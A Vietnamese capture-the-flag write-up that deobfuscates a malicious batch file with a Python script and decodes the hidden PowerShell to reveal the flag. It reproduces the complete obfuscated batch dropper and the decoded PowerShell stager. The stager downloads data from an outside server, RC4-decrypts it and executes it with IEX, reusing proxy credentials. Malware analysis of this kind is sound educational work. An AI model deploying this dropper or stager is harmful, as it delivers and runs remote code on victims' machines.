![image](https://github.com/NVex0/uWU/assets/113530029/749a83f3-47e8-448a-8f1b-4c126d73a733)

Đề cho ta 1 payload bat, obfuscate nó bằng cách replace tên biến. Mình chuyển nó thành dạng code python rồi chạy thôi :))

Ý tưởng là xem xét quy luật các dấu nháy, bằng,.... trong code để replace về form python. Đây là solvescript:

```
import re

batdata = """set "Rvsbpmhlmt=exit"
set "Txincqurfx=if not DEFINED IS_MI" & set "Zqcyqidklg=min "%~dpnx0" %* && " & set "Onkhhdyhhb=NIMIZED set IS_MINIM" & set "Mqiirtukji=IZED=1 && start "" /"
%Txincqurfx%%Onkhhdyhhb%%Mqiirtukji%%Zqcyqidklg%%Rvsbpmhlmt%

set "Tdoblhowds=erShell\v1.0\powersh" & set "Avvntausem=ell.exe %temp%\Eartt" & set "Ljyquixmun=\System32\WindowsPow" & set "Ghgrymkrbp=xmxaqr.png"
set "Anvakrxgse= /y /h /i C:\Windows"
set "Vjhwyxllqy=echo F | xcopy /d /q"
%Vjhwyxllqy%%Anvakrxgse%%Ljyquixmun%%Tdoblhowds%%Avvntausem%%Ghgrymkrbp%
set "Ihhmxwdywx= /y /h /i %0 %temp%"
set "Dadpolxunf=echo F | xcopy /d /q"
set "Unscdsiwaa=Earttxmxaqr.png.bat"
%Dadpolxunf%%Ihhmxwdywx%%Unscdsiwaa%
cls
set "xkcscoxdxe=ACUAMgA1ADYAXQB9AH0A"
set "vjcwqonetf=AEMAbwB1AG4AdABdACkA"
set "rbqecbginc=ACQAaQB2AD0AJABkAGEA"
set "uuhyczmmxe=AC0AagBvAGkAbgBbAEMA"
set "inyahuzxoo=AGMAawBvACcAOwAkAHMA"
set "epijlrhjmq=YgA0AHQAXwBmADEAbAAz"
set "tnksxiibte=aQBjAGUAUABvAGkAbgB0"
set "yeitcnwdjv=TgBlAHQALgBXAGUAYgBD"
set "dfbbguetbi=LgBDAHIAZQBkAGUAbgB0"
set "dfbkfcybvd=AEoAXQAsACQAUwBbACQA"
set "wgyylpwodl=LgAuADIANQA1ADsAMAAu"
set "owdgfkrmmu=ZQBtAC4ATgBlAHQALgBX"
set "crjpoyymri=LgBQAHIAbwB4AHkAOwAk"
set "kkuvpmsxnx=NABTAHQAcgBpAG4AZwAo"
set "oxzuhafyty=XQA6ADoARQB4AHAAZQBj"
set "laamgfxxbt=AHMAYwA0AHQAMwBkAF8A"
set "kcijfzedak=AHQAJwAsACQAdQApADsA"
set "twtebvsaka=LQBPAGIAagBlAGMAdAAg"
set "rlfaegqlsg=aQBwAHQAOgBQAHIAbwB4"
set "nemzfezpoy=AC4AQQBkAGQAKAAnAFUA"
set "tekuivufxk=AFsAJABJAF0AOwAkAF8A"
set "nnhkxernpw=AGEAdABhAD0AJAB3AGMA"
set "zwqujbxyth=cgBvAGMAZQBzAHMALgBw"
set "rtkivjiqyi=dAAvADcALgAwADsAIABy"
set "qazgeuuryt=ACAAVAByAGkAZABlAG4A"
set "freecdurxu=OwAgAFcATwBXADYANAA7"
set "rbltgxozsy=AHsAJABJAD0AKAAkAEkA"
set "hxrxbmcrab=LQBiAHgAbwByACQAUwBb"
set "mtozbwhmdh=AC4AJABkAGEAdABhAC4A"
set "ggrgkijhev=AC4AMgA1ADUAfAAlAHsA"
set "zctzhvkube=AEsAPQBbAFMAeQBzAHQA"
set "slzbngdcxw=AGwAcwA7ACQAUwBjAHIA"
set "xrmnnquwgb=AE4AZQB0AC4AQwByAGUA"
set "iksmcfhnba=JAB3AGMALgBQAHIAbwB4"
set "pwojxvfdhy=AF0AKQAlADIANQA2ADsA"
set "cksjilhxsl=ACkAOwAkAFIAPQB7ACQA"
set "unuxwliqbr=AHIAcwBpAG8AbgAuAE0A"
set "ankyzawudo=JQAyADUANgA7ACQAUwBb"
set "jklvvznyoo=YgBsAGUALgBQAFMAVgBl"
set "mpmxufelmw=AHMAXwBjADQAbgBfAGIA"
set "ijtnxiydgk=IABsAGkAawBlACAARwBl"
set "livcnxklbi=AEEARABVAEEATQBnAEEA"
set "ywpjosgjdg=JABKAF0APQAkAFMAWwAk"
set "amedfzkpqa=AGkAYQBsAHMAIAA9ACAA"
set "fztuwvreiu=bABlAG4AZwB0AGgAXQA7"
set "cfsfpfaifn=AHkAPQBbAFMAeQBzAHQA"
set "talukgjglh=AGUAdAAuAFMAZQByAHYA"
set "gdxqtuxjtg=AG8AbQBCAGEAcwBlADYA"
set "udtkpvpwlh=dABlAHMAKAAnAGsAJQBO"
set "kkqqmvlfek=ACQAZgBsAGEAZwA9ACcA"
set "xynekerpsz=ACQASwApACkAfABJAEUA"
set "tgznzidgdc=ACQAXwBdACwAJABTAFsA"
set "xkbtgjgsbm=dABhAFsAMAAuAC4AMwBd"
set "dpbpdabswl=AGEAdQBsAHQAVwBlAGIA"
set "tkspqgfezg=ACQAdwBjAD0ATgBlAHcA"
set "xnsddewkjt=KABXAGkAbgBkAG8AdwBz"
set "vkxtpcsvkp=RAAsACQASwA9ACQAQQBy"
set "hkihdroftw=AGUAYgBSAGUAcQB1AGUA"
set "lwmpnyaakc=SABxAGYAZABvAH0ARgBa"
set "vbrffrcyuk=cwBlAHIALQBBAGcAZQBu"
set "qifiosnmwm=AFkAaQA3ACMAQwBQADUA"
set "cvxqumcgfs=eQBkAHIAegA9AEMAeABw"
set "zxavotsvle=AH0AJwA7ACQASAA9ACgA"
set "dfwfymvxpv=AH4ALQB7ACEAUQBVADEA"
set "pbervxlqvc=AFMAWwAkAF8AXQArACQA"
set "primtbeqjb=AGgAcAAnADsAJAB3AGMA"
set "hzdehetswc=OwAkAHcAYwAuAEgAZQBh"
set "hbqmigzuyd=AGwAbwBnAGkAbgAvAHAA"
set "ymqktainir=AGcAKABbAEMAbwBuAHYA"
set "akmeqpqplz=MABzAD0AIgApADsAJABk"
set "rhieovvavv=dABhACAAKAAkAEkAVgAr"
set "frcuonrsae=cQB3AFYAYQA1AEEAMwBr"
set "vmoothwjeg=QQBEAGsAQQBPAEEAQQB1"
set "ezwgclnoht=MwBfADQAXwBtADMAcwBz"
set "tajqgeimkk=UwBbACQASABdACwAJABT"
set "gggylivaaj=AHkAIAA9ACAAJAB3AGMA"
set "dtbpjnfqte=RABlAGYAYQB1AGwAdABO"
set "talwelwshg=AGwAaQBlAG4AdAA7ACQA"
set "gwhtilbklu=WAA=" & set "Xtnpsjntki=%temp%\Earttxmxaqr.p"
set "eubxycigil=AEkALgBHAGUAdABCAHkA"
set "yxtvktkqbj=LgBIAGUAYQBkAGUAcgBz"
set "gldgpaqmdi=ADgAQQBMAHcAQQAzAEEA"
set "nltfuhtqsp=AHYAOgAxADEALgAwACkA"
set "arirjwuufe=ZABpAG4AZwBdADoAOgBV"
set "iyxnbwqwvj=AGMALgBQAHIAbwB4AHkA"
set "groykdejaf=ZQByAHQAXQA6ADoARgBy"
set "kfknsjurus=SwBbACQAXwAlACQASwAu"
set "xoezfsghqq=AEUAbgBjAG8AZABpAG4A"
set "dwoqpodpsx=UAByAG8AeAB5ADsAJAB3"
set "ljwlrzenef=JABkAGEAdABhAFsANAAu"
set "peaqqqzjhx=AG4AaQBjAG8AZABlAC4A"
set "ipvgcrqunf=AHIAcwBpAG8AbgBUAGEA"
set "adoosmqieq=AHQAMQAwADAAQwBvAG4A"
set "tpxihlfyyl=ADQAQQBEAE0AQQAnACkA"
set "hfvvkjkppw=KwAkAFMAWwAkAEgAXQAp"
set "btfeyoqgdd=KQApADsAJAB0AD0AJwAv"
set "tnjodalaim=AEsAcgBaAGMAdgBKADMA"
set "qwfhawtkpd=AGQAZQByAHMALgBBAGQA"
set "sfrjcuonvm=ACgAJABTAFsAJABJAF0A"
set "pixeueaexo=RwBlAHQAUwB0AHIAaQBu"
set "mtdhxnskxu=cwBlAHIAKwAkAHQAKQA7"
set "aktiwqjlij=AGUAdAB3AG8AcgBrAEMA"
set "yxqthvhhnc=AFcAZwBGADcAUQB1AGoA"
set "ooerzyphxp=AGwAYQAvADUALgAwACAA"
set "uvbsyaoahv=AGUAIgAsACIAawBwAFAA"
set "ztrqzcsghu=dQA9ACcATQBvAHoAaQBs"
set "prqqperknc=AGEAYwBoAGUAXQA6ADoA"
set "rrqelfomcx=QgBFAD0AegAuADkAbAAn"
set "zemewtnpgi=AFMAeQBzAHQAZQBtAC4A"
set "fwafmpmjol=JABTAFsAJABJAF0ALAAk"
set "xmbiatjqzd=cwB0AF0AOgA6AEQAZQBm"
set "gnvquaaikl=AE0AYQBuAGEAZwBlAHIA"
set "jucgtcyjlz=ZQBtAC4AVABlAHgAdAAu"
set "gchigjdpna=LgBEAG8AdwBuAGwAbwBh"
set "klymlpbwwk=YQBqAG8AcgAgAC0AZwBl"
set "iwnclvszmb=XwBdAH0AOwAkAEQAfAAl"
set "iqoqanaaht=AGcAcwA7ACQAUwA9ADAA"
set "dmzvddozpq=WwBTAHkAcwB0AGUAbQAu"
set "jbdzflrwit=JABKAD0AKAAkAEoAKwAk"
set "dympkboccz=RABjAEEATABnAEEAMwBB"
set "ncqfvygbex=SABUAEIAewAwAGIAZgB1" & set "Uvpjcsfkps=ng -win 1 -enc "
set "pgssozxnkn=KwAxACkAJQAyADUANgA7"
set "niyfborvvb=AFMAWwAkAEgAXQA9ACQA"
set "ifeszkpyma=ACAAJABSACAAJABkAGEA"
set "rbwcdidvor=ZwBdADoAOgBBAFMAQwBJ"
set "bvqepppuph=ZABlAG4AdABpAGEAbABD"
set "inghbxsuez=aABhAHIAWwBdAF0AKAAm"
set "lhksbxgxno=ACcAYQBBAEIAMABBAEgA"
set "jlzegvmqkh=dABpAG4AdQBlAD0AMAA7"
set "bnimzrairh=AHgAdAAuAEUAbgBjAG8A"
set "tirgstjpnp=UQBBAGMAQQBBADYAQQBD"
set "vayhzkaoxh=AGQARABhAHQAYQAoACQA"
set "rkqopnuhak=ZQByAD0AJAAoAFsAVABl"
set "sbcgacqtjz=AEQAUQBBAEwAZwBBAHgA"
set "mjugibbccj=NgBBAEQAZwBBAE0AQQBB"
set "abfcbernie=ACAATgBUACAANgAuADEA"
set "lrowavctaw=ZAAoACIAQwBvAG8AawBp"
set "mxtypxhupc=JABIACsAJABTAFsAJABJ"
set "eejhicejye=ADsAJABkAGEAdABhAD0A"
set "mbruopeait=cgBlAGQAZQBuAHQAaQBh"
set "dysfnbgmrs=ACAAMwApAHsAfQA7AFsA"
set "llecwxirrv=SQBmACgAJABQAFMAVgBl"
set "odqqbrqxgc=UwB5AHMAdABlAG0ALgBO"

%Xtnpsjntki%%Uvpjcsfkps%%llecwxirrv%%ipvgcrqunf%%jklvvznyoo%%unuxwliqbr%%klymlpbwwk%%dysfnbgmrs%%odqqbrqxgc%%talukgjglh%%tnksxiibte%%gnvquaaikl%%oxzuhafyty%%adoosmqieq%%jlzegvmqkh%%tkspqgfezg%%twtebvsaka%%zemewtnpgi%%yeitcnwdjv%%talwelwshg%%ztrqzcsghu%%ooerzyphxp%%xnsddewkjt%%abfcbernie%%freecdurxu%%qazgeuuryt%%rtkivjiqyi%%nltfuhtqsp%%ijtnxiydgk%%inyahuzxoo%%rkqopnuhak%%bnimzrairh%%arirjwuufe%%peaqqqzjhx%%pixeueaexo%%ymqktainir%%groykdejaf%%gdxqtuxjtg%%kkuvpmsxnx%%lhksbxgxno%%tirgstjpnp%%gldgpaqmdi%%dympkboccz%%sbcgacqtjz%%vmoothwjeg%%livcnxklbi%%mjugibbccj%%tpxihlfyyl%%btfeyoqgdd%%hbqmigzuyd%%zwqujbxyth%%primtbeqjb%%yxtvktkqbj%%nemzfezpoy%%vbrffrcyuk%%kcijfzedak%%iksmcfhnba%%cfsfpfaifn%%owdgfkrmmu%%hkihdroftw%%xmbiatjqzd%%dpbpdabswl%%dwoqpodpsx%%iyxnbwqwvj%%dfbbguetbi%%amedfzkpqa%%dmzvddozpq%%xrmnnquwgb%%bvqepppuph%%prqqperknc%%dtbpjnfqte%%aktiwqjlij%%mbruopeait%%slzbngdcxw%%rlfaegqlsg%%gggylivaaj%%crjpoyymri%%zctzhvkube%%jucgtcyjlz%%xoezfsghqq%%rbwcdidvor%%eubxycigil%%udtkpvpwlh%%dfwfymvxpv%%lwmpnyaakc%%qifiosnmwm%%rrqelfomcx%%cksjilhxsl%%vkxtpcsvkp%%iqoqanaaht%%wgyylpwodl%%ggrgkijhev%%jbdzflrwit%%pbervxlqvc%%kfknsjurus%%vjcwqonetf%%ankyzawudo%%tgznzidgdc%%ywpjosgjdg%%dfbkfcybvd%%iwnclvszmb%%rbltgxozsy%%pgssozxnkn%%kkqqmvlfek%%ncqfvygbex%%laamgfxxbt%%epijlrhjmq%%mpmxufelmw%%ezwgclnoht%%zxavotsvle%%mxtypxhupc%%pwojxvfdhy%%fwafmpmjol%%niyfborvvb%%tajqgeimkk%%tekuivufxk%%hxrxbmcrab%%sfrjcuonvm%%hfvvkjkppw%%xkcscoxdxe%%hzdehetswc%%qwfhawtkpd%%lrowavctaw%%uvbsyaoahv%%cvxqumcgfs%%tnjodalaim%%frcuonrsae%%yxqthvhhnc%%akmeqpqplz%%nnhkxernpw%%gchigjdpna%%vayhzkaoxh%%mtdhxnskxu%%rbqecbginc%%xkbtgjgsbm%%eejhicejye%%ljwlrzenef%%mtozbwhmdh%%fztuwvreiu%%uuhyczmmxe%%inghbxsuez%%ifeszkpyma%%rhieovvavv%%xynekerpsz%%gwhtilbklu%""" 

batdata = batdata.replace(" & ", "\n")
batlist = batdata.split("\n")
deobfuscated_script = ""
for i in batlist:
    if i != "cls":
        if i != "":
            if i[0] == '%':
                i = i[1:-1]
                i = i.replace('%%', '+')
                i = f"print({i})"
            else:
                i = i.replace('set "', "")
                equalpos = re.search("=", i).start()
                i = i[:equalpos] + "=r'" + i[equalpos+1:-1] + "'"
        deobfuscated_script += i + '\n'
        
exec(deobfuscated_script)
```

Output như này:

![image](https://github.com/NVex0/uWU/assets/113530029/3b398d25-936b-4b0b-8a83-efc4be001825)

Ta decode base64 ra thôi. Output sẽ như sau:
```
If($PSVersionTable.PSVersion.Major -ge 3){};[System.Net.ServicePointManager]::Expect100Continue=0;$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADMA')));$t='/login/process.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('k%N~-{!QU1Hqfdo}FZYi7#CP5BE=z.9l');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$flag='HTB{0bfusc4t3d_b4t_f1l3s_c4n_b3_4_m3ss}';$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","kpPydrz=CxpKrZcvJ3qwVa5A3kWgF7Quj0s=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX
```
Ra cái code oneline, vẫn khá khó nhìn, ta replace thêm dấu xuống dòng sau ";" là được:

![image](https://github.com/NVex0/uWU/assets/113530029/6a879ff2-4459-4151-bf1a-d02869d16523)

Tới đây thấy luôn flag rồi.

Flag: `HTB{0bfusc4t3d_b4t_f1l3s_c4n_b3_4_m3ss}`
